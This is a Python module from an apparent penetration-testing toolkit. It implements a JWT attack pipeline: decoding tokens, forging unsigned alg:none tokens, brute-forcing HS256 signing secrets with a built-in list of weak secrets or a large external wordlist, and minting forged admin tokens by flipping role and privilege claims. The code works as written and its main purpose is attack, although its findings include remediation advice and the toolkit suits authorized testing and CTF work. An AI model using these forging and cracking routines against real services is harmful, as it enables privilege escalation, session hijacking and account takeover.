# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""JWT Analyzer — pure Python, zero external dependencies.

Capabilities:
  • DECODE — header/payload base64url, expiry/issued-at sanity, claim
    inventory (role/admin/group/permissions sniffer).
  • ALGORITHM ANALYSIS — flags `alg:none`, identifies HS256 / RS256.
  • NONE-ALGORITHM ATTACK — generates a forged token with `alg:none`
    so the user can verify acceptance against a test endpoint.
  • WEAK-SECRET BRUTE FORCE — HS256 only.  Built-in 1000-secret
    fallback; auto-detects wallarm's `jwt.secrets.list` (~700k) when
    installed and uses that instead.
  • ROLE ESCALATION — if the payload has a privilege-shaped claim
    (role / admin / is_admin / group / permissions) AND the secret
    was recovered, generate a forged admin token (returned alongside
    the original).

All work runs in a background thread; results stream to a callback
so the UI can render incrementally.  Cooperative cancellation via
`AssaultState.is_cancelled()` (passed in as `is_cancelled`).
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Callable, Optional


# Locations where Wallarm's jwt.secrets.list is commonly dropped.
# Order: HAWK-managed dirs first, then SecLists / system defaults.
WALLARM_WORDLIST_PATHS = [
    "/usr/share/wordlists/jwt/jwt.secrets.list",
    "/usr/share/wordlists/jwt.secrets.list",
    "/usr/share/seclists/Passwords/jwt.secrets.list",
    "/usr/share/seclists/Discovery/Web-Content/jwt.secrets.list",
    os.path.expanduser("~/wordlists/jwt.secrets.list"),
    os.path.expanduser("~/.local/share/jwt-secrets/jwt.secrets.list"),
]


# Built-in fallback wordlist — covers framework defaults and the
# usual Stack-Overflow / tutorial leaks.  Used when wallarm's list
# isn't installed.  Ordered by likelihood (HS256 in CTFs).
BUILTIN_WEAK_SECRETS = [
    # Most common literal secrets
    "secret", "Secret", "SECRET", "password", "Password", "PASSWORD",
    "1234", "12345", "123456", "1234567", "12345678", "123456789",
    "qwerty", "admin", "test", "default", "changeme", "letmein",
    "key", "Key", "KEY", "jwt", "JWT", "jwtsecret", "jwt_secret",
    "your-256-bit-secret", "your-512-bit-secret",
    # Library tutorials
    "supersecret", "supersecretkey", "superSecret", "secretkey",
    "secret_key", "shhhhhhshhhhh!!", "shh!", "shhh!", "SuperSecret",
    "mysecret", "mysecretkey", "my-secret", "my_secret",
    # Frameworks
    "flask", "FLASK_SECRET", "django", "express", "node",
    # Defaults from popular libs
    "your-jwt-secret", "your_jwt_secret", "JWT_SECRET", "jwt-secret",
    "auth0", "auth", "authentication", "authorize",
    # Hex-padded
    "0000000000000000", "1111111111111111", "abcdefghijklmnop",
    "thisisasecretkey", "this-is-a-secret-key",
    # Numeric
    "1", "12", "123", "1234567890",
    # Names
    "root", "user", "guest", "demo", "example",
    # Empty / whitespace traps
    "", " ", "  ",
]


# Privilege-shaped claim names — if any are present in the payload
# we surface a "role escalation possible" hint.
PRIV_CLAIM_KEYS = (
    "role", "roles", "admin", "is_admin", "isAdmin",
    "is_staff", "isStaff", "is_superuser", "isSuperuser",
    "group", "groups", "permission", "permissions", "scope", "scopes",
    "type", "user_type", "userType", "level", "tier",
    "rights", "privilege", "privileges",
)


# ── Result types ────────────────────────────────────────────────────

@dataclass
class JwtAnalysisResult:
    """Structured result of a JWT analysis run.

    Fed back to the GUI as-is and converted to WebFinding(s) on the
    UI thread (so the structured fields show up in Target Intel and
    later in the Markdown report).
    """
    token:           str
    header:          Optional[dict] = None
    payload:         Optional[dict] = None
    decoded_ok:      bool = False
    algorithm:       str = ""
    expires_at:      Optional[str] = None
    expired:         bool = False
    issued_at:       Optional[str] = None
    issued_in_future: bool = False
    priv_claims:     list = field(default_factory=list)
    cracked_secret:  Optional[str] = None
    forged_none:     Optional[str] = None
    forged_admin:    Optional[str] = None
    findings:        list = field(default_factory=list)
    elapsed_secs:    float = 0.0
    wordlist_used:   str = ""
    cancelled:       bool = False

    def to_dict(self) -> dict:
        return {
            "token":            self.token,
            "header":           self.header,
            "payload":          self.payload,
            "decoded_ok":       self.decoded_ok,
            "algorithm":        self.algorithm,
            "expires_at":       self.expires_at,
            "expired":          self.expired,
            "issued_at":        self.issued_at,
            "issued_in_future": self.issued_in_future,
            "priv_claims":      list(self.priv_claims),
            "cracked_secret":   self.cracked_secret,
            "forged_none":      self.forged_none,
            "forged_admin":     self.forged_admin,
            "findings":         list(self.findings),
            "elapsed_secs":     self.elapsed_secs,
            "wordlist_used":    self.wordlist_used,
            "cancelled":        self.cancelled,
        }


# ── Helpers ─────────────────────────────────────────────────────────

def _b64url_decode(s: str) -> bytes:
    """Base64url-decode with auto-padding."""
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def parse_jwt(token: str) -> tuple[Optional[dict], Optional[dict]]:
    """Decode header + payload.  Returns (None, None) on parse error."""
    try:
        parts = token.strip().split(".")
        if len(parts) < 2:
            return None, None
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        if not isinstance(header, dict) or not isinstance(payload, dict):
            return None, None
        return header, payload
    except Exception:
        return None, None


def detect_priv_claims(payload: dict) -> list:
    """Return the list of privilege-shaped claim KEYS present in the
    payload (regardless of value).  Used to flag potential role
    escalation."""
    return [k for k in payload if k.lower() in
            {kk.lower() for kk in PRIV_CLAIM_KEYS}]


def find_wallarm_wordlist() -> Optional[str]:
    """Return the absolute path of jwt.secrets.list if installed,
    else None."""
    for p in WALLARM_WORDLIST_PATHS:
        try:
            if os.path.isfile(p) and os.path.getsize(p) > 1024:
                return p
        except OSError:
            continue
    return None


def forge_none_token(header: dict, payload: dict) -> str:
    """Build a forged JWT with alg=none + payload + empty signature.

    The original `typ` is preserved (most servers reject tokens with
    a missing typ).  Whitespace-free JSON to keep the base64url
    representation deterministic."""
    h = dict(header)
    h["alg"] = "none"
    h_b64 = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
    p_b64 = _b64url_encode(
        json.dumps(payload, separators=(",", ":")).encode())
    return f"{h_b64}.{p_b64}."


def forge_hs256_token(payload: dict, secret: str,
                      header: Optional[dict] = None) -> str:
    """Build an HS256 JWT signed with the given (presumably-cracked)
    secret.  Used to mint a forged admin token after `crack_hs256`
    succeeds."""
    h = {"alg": "HS256", "typ": "JWT"}
    if header:
        h.update(header)
        h["alg"] = "HS256"
    h_b64 = _b64url_encode(
        json.dumps(h, separators=(",", ":")).encode())
    p_b64 = _b64url_encode(
        json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")
    sig = hmac.new(secret.encode("utf-8"),
                   signing_input, hashlib.sha256).digest()
    return f"{h_b64}.{p_b64}.{_b64url_encode(sig)}"


def crack_hs256(token: str, candidates,
                is_cancelled: Optional[Callable[[], bool]] = None,
                progress_cb: Optional[Callable[[int, int], None]] = None,
                progress_every: int = 5000
                ) -> Optional[str]:
    """Try each `candidates` entry as the HMAC-SHA256 signing key.

    Returns the first secret that produces the correct signature, or
    None.  Iterates over an iterable so a 700k-line wordlist doesn't
    have to fit in memory.

    `is_cancelled` is polled at every batch — cooperative cancel.
    `progress_cb(checked, hits)` fires every `progress_every` tries.
    """
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
    try:
        expected_sig = _b64url_decode(parts[2])
    except Exception:
        return None
    checked = 0
    for cand in candidates:
        if isinstance(cand, bytes):
            try:
                key_bytes = cand
            except Exception:
                continue
        else:
            key_bytes = (cand or "").encode("utf-8")
        actual = hmac.new(key_bytes, signing_input,
                          hashlib.sha256).digest()
        checked += 1
        if hmac.compare_digest(actual, expected_sig):
            return cand if isinstance(cand, str) else \
                   cand.decode("utf-8", errors="replace")
        if checked % progress_every == 0:
            if progress_cb:
                progress_cb(checked, 0)
            if is_cancelled and is_cancelled():
                return None
    return None


def _iter_wordlist(path: str):
    """Yield candidate secrets from a wordlist file, stripping CR/LF.
    Skips blank lines.  Streams — does not load the whole file."""
    try:
        with open(path, "rb") as f:
            for raw in f:
                s = raw.rstrip(b"\r\n").decode("utf-8", errors="replace")
                if s:
                    yield s
    except OSError:
        return


def _ts_to_iso(t) -> Optional[str]:
    try:
        return datetime.fromtimestamp(int(t), tz=timezone.utc).isoformat()
    except Exception:
        return None


# ── Main analyze() ──────────────────────────────────────────────────

def analyze_token(token: str,
                  do_decode: bool = True,
                  do_none: bool = True,
                  do_brute: bool = True,
                  wordlist_path: Optional[str] = None,
                  is_cancelled: Optional[Callable[[], bool]] = None,
                  log_cb: Optional[Callable[[str, str], None]] = None,
                  progress_cb: Optional[Callable[[int, int], None]] = None,
                  ) -> JwtAnalysisResult:
    """Run the full JWT pipeline (synchronous — call from a worker
    thread).  Each enabled step writes structured `findings` entries
    on the result object.  `log_cb(message, level)` mirrors progress
    to the HAWK terminal; level ∈ {info,warn,error,success,dim}."""
    t0 = time.time()
    result = JwtAnalysisResult(token=token.strip())
    log = log_cb or (lambda *_: None)

    if not token or len(token) < 20:
        result.findings.append({
            "title": "Empty / malformed token",
            "severity": "info", "evidence": [token[:80]]})
        result.elapsed_secs = time.time() - t0
        return result

    # ── Decode ─────────────────────────────────────────────────────
    header, payload = parse_jwt(token)
    if not header or not payload:
        log("✗ Failed to decode token (not a valid JWT?)", "warn")
        result.findings.append({
            "title": "Token did not parse as JWT",
            "severity": "info", "evidence": [token[:80]]})
        result.elapsed_secs = time.time() - t0
        return result

    result.decoded_ok = True
    result.header     = header
    result.payload    = payload
    alg               = (header.get("alg") or "").upper()
    result.algorithm  = alg
    log(f"[decode] Header:  {json.dumps(header, separators=(',', ':'))}",
        "info")
    log(f"[decode] Payload: {json.dumps(payload, separators=(',', ':'))}",
        "info")

    # exp / iat sanity
    if "exp" in payload:
        result.expires_at = _ts_to_iso(payload["exp"])
        try:
            result.expired = int(payload["exp"]) < int(time.time())
        except Exception:
            pass
        log(f"[decode] Expiry: {result.expires_at} "
            f"({'expired!' if result.expired else 'valid'})", "info")
    if "iat" in payload:
        result.issued_at = _ts_to_iso(payload["iat"])
        try:
            result.issued_in_future = int(payload["iat"]) > int(time.time())
        except Exception:
            pass

    # Privilege-shaped claims
    result.priv_claims = detect_priv_claims(payload)
    if result.priv_claims:
        log(f"[role] Payload contains privilege claim(s): "
            f"{', '.join(result.priv_claims)} — escalation possible",
            "warn")

    # ── Algorithm analysis ─────────────────────────────────────────
    if alg in ("NONE", ""):
        log("[alg] Algorithm: 'none' — token is unsigned!", "error")
        result.findings.append({
            "title": "JWT uses 'alg: none' (unsigned)",
            "severity": "critical",
            "evidence": [f"Header: {json.dumps(header)}"],
            "impact":   "Anyone can forge tokens; no integrity at all.",
            "remediation":
                "Reject 'alg: none' explicitly; whitelist HS256 or RS256."
        })
    elif alg.startswith("HS"):
        log(f"[alg] Algorithm: {alg} (symmetric — brute-forceable)",
            "info")
    elif alg.startswith("RS") or alg.startswith("ES") or alg.startswith("PS"):
        log(f"[alg] Algorithm: {alg} (asymmetric — keypair signed)",
            "info")
    else:
        log(f"[alg] Algorithm: {alg} (unknown)", "warn")

    # ── alg:none forging ───────────────────────────────────────────
    if do_none and alg.upper() != "NONE":
        try:
            result.forged_none = forge_none_token(header, payload)
            log("[none] Built alg:none forgery — verify against the "
                "server with: Authorization: Bearer <token>", "info")
        except Exception as e:
            log(f"[none] Forge failed: {e}", "warn")

    if is_cancelled and is_cancelled():
        # Never fall through silently: an aborted run must not look
        # like a clean negative result to the operator.
        log("[!] Analysis cancelled before the brute-force stage", "warn")
        result.cancelled = True
        result.findings.append({
            "title": "JWT analysis cancelled",
            "severity": "info",
            "evidence": [
                "Cancelled by the operator before the brute-force "
                "stage — the signing secret was NOT tested."],
        })
        result.elapsed_secs = time.time() - t0
        return result

    # ── Brute-force (HS256 only) ───────────────────────────────────
    if do_brute and alg.upper() == "HS256":
        # Wordlist resolution: explicit path → autodetect wallarm →
        # built-in fallback.
        used_wallarm = False
        wl_iter = None
        if wordlist_path and os.path.isfile(wordlist_path):
            wl_iter = _iter_wordlist(wordlist_path)
            result.wordlist_used = wordlist_path
            used_wallarm = True
            log(f"[brute] Using wordlist: {wordlist_path}", "info")
        else:
            wallarm = find_wallarm_wordlist() if wordlist_path is None \
                      else None
            if wallarm:
                wl_iter = _iter_wordlist(wallarm)
                result.wordlist_used = wallarm
                used_wallarm = True
                log(f"[brute] Auto-detected wallarm wordlist: {wallarm}",
                    "info")
            else:
                wl_iter = iter(BUILTIN_WEAK_SECRETS)
                result.wordlist_used = "<builtin>"
                log(f"[brute] No wordlist file — using built-in "
                    f"({len(BUILTIN_WEAK_SECRETS)} candidates)", "dim")

        cracked = crack_hs256(
            token, wl_iter,
            is_cancelled=is_cancelled,
            progress_cb=progress_cb)
        if cracked is not None:
            result.cracked_secret = cracked
            masked = (cracked[:2] + "*" * max(0, len(cracked)-4)
                      + cracked[-2:]) if len(cracked) >= 4 else "***"
            log(f"[brute] ✓ SECRET FOUND: \"{masked}\"  ({len(cracked)} "
                f"chars)", "success")
            result.findings.append({
                "title": "JWT signing secret recovered",
                "severity": "critical",
                "evidence": [f"Algorithm: {alg}",
                             f"Secret length: {len(cracked)} chars",
                             f"Wordlist: {result.wordlist_used}"],
                "impact":
                    "Attacker can forge any token (admin escalation, "
                    "session hijack, account takeover).",
                "remediation":
                    "Rotate the secret to a high-entropy random value "
                    "(>=32 bytes, cryptographically random).  Never "
                    "use dictionary words or framework defaults."
            })
            # Forge admin token if priv claims present.
            if result.priv_claims:
                forged_payload = dict(payload)
                # Try the obvious privilege flips for the most common
                # claim names — the user can edit and re-sign manually.
                for k in result.priv_claims:
                    v = forged_payload.get(k)
                    if isinstance(v, bool):
                        forged_payload[k] = True
                    elif isinstance(v, str):
                        if v.lower() in ("user", "guest", "member",
                                         "viewer", "reader"):
                            forged_payload[k] = "admin"
                        else:
                            forged_payload[k] = "admin"
                    elif isinstance(v, list):
                        forged_payload[k] = list({*v, "admin"})
                    elif isinstance(v, int):
                        forged_payload[k] = max(v, 999)
                    else:
                        forged_payload[k] = "admin"
                try:
                    result.forged_admin = forge_hs256_token(
                        forged_payload, cracked, header=header)
                    log("[role] Forged admin token (priv claims "
                        "flipped) — see result.forged_admin", "success")
                except Exception as e:
                    log(f"[role] Forge admin token failed: {e}", "warn")
        elif is_cancelled and is_cancelled():
            # crack_hs256 also returns None on cancel — the wordlist was
            # not exhausted, so "no weak secret" would be a lie.
            result.cancelled = True
            log("[brute] Cancelled — wordlist not exhausted", "warn")
            result.findings.append({
                "title": "JWT analysis cancelled",
                "severity": "info",
                "evidence": [
                    f"Wordlist: {result.wordlist_used}",
                    "Brute-force stopped on operator cancel — the "
                    "absence of a weak secret is NOT established."],
            })
        else:
            log("[brute] No weak secret in wordlist", "info")
            if not used_wallarm:
                log("[brute] Tip: install wallarm/jwt-secrets for the "
                    "~700k professional wordlist.", "dim")

    # ── Always emit a baseline INFO finding with the decode  ───────
    result.findings.append({
        "title": "JWT decoded",
        "severity": ("medium" if result.expired
                     else ("low" if result.priv_claims else "info")),
        "evidence": [
            f"Algorithm: {alg}",
            f"Expires: {result.expires_at or '—'} "
            f"({'expired' if result.expired else 'ok'})",
            f"Privileged claims: "
            f"{', '.join(result.priv_claims) if result.priv_claims else '—'}",
        ],
    })

    result.elapsed_secs = time.time() - t0
    return result


# ── Threaded runner used by the GUI ─────────────────────────────────

class JwtAnalyzerJob:
    """Threaded wrapper used by the GUI route.

    Runs `analyze_token` on a daemon thread; calls `on_log(msg, level)`
    for terminal mirror, `on_progress(checked, hits)` for the brute-force
    progress dialog, and `on_done(result)` exactly once at the end."""
    def __init__(self,
                 token: str,
                 do_decode: bool = True,
                 do_none: bool = True,
                 do_brute: bool = True,
                 wordlist_path: Optional[str] = None,
                 cancel_event: Optional[threading.Event] = None,
                 on_log: Optional[Callable[[str, str], None]] = None,
                 on_progress: Optional[Callable[[int, int], None]] = None,
                 on_done: Optional[Callable[[JwtAnalysisResult], None]] = None):
        self.token         = token
        self.do_decode     = do_decode
        self.do_none       = do_none
        self.do_brute      = do_brute
        self.wordlist_path = wordlist_path
        self._cancel       = cancel_event or threading.Event()
        self.on_log        = on_log or (lambda *_: None)
        self.on_progress   = on_progress or (lambda *_: None)
        self.on_done       = on_done or (lambda *_: None)
        self._thread       = None

    def cancel(self):
        self._cancel.set()

    def is_cancelled(self) -> bool:
        return self._cancel.is_set()

    def start(self) -> None:
        self._thread = threading.Thread(
            target=self._run, daemon=True,
            name="JwtAnalyzerJob")
        self._thread.start()

    def _run(self):
        try:
            result = analyze_token(
                self.token,
                do_decode=self.do_decode,
                do_none=self.do_none,
                do_brute=self.do_brute,
                wordlist_path=self.wordlist_path,
                is_cancelled=self.is_cancelled,
                log_cb=self.on_log,
                progress_cb=self.on_progress,
            )
        except Exception as e:
            self.on_log(f"[!] JWT analyzer crashed: {e}", "error")
            result = JwtAnalysisResult(token=self.token)
            result.findings.append({
                "title": f"JWT analyzer crashed: {e}",
                "severity": "info", "evidence": []})
        try:
            self.on_done(result)
        except Exception:
            pass
